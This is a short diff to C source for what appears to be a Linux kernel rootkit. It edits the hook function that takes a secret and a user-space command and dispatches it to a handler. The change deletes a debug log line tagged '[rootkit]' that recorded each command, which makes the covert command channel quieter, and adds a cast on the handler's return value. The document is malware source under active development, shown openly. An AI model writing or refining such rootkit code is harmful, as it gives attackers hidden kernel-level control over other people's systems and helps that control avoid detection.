@@ -81,7 +81,6 @@ unsigned long iface_hook_func(unsigned long secret, char __user *command,
   for (i = 0; i < sizeof(iface__commands) / sizeof(iface__commands[0]); i++) {
     if (!strcmp(command_buf, iface__commands[i].command)) {
       handler = iface__commands[i].handler;
-      printk(KERN_INFO "[rootkit] command \"%s\" -> handler %p\n", command_buf, handler);
       break;
     }
   }
@@ -89,7 +88,7 @@ unsigned long iface_hook_func(unsigned long secret, char __user *command,
   if (handler != NULL)
     /* the command exists, and has a handler */
 
-    return (*handler)(arg0, arg1, arg2, arg3);
+    return (unsigned long) (*handler)(arg0, arg1, arg2, arg3);
   return -EINVAL;
 }
 
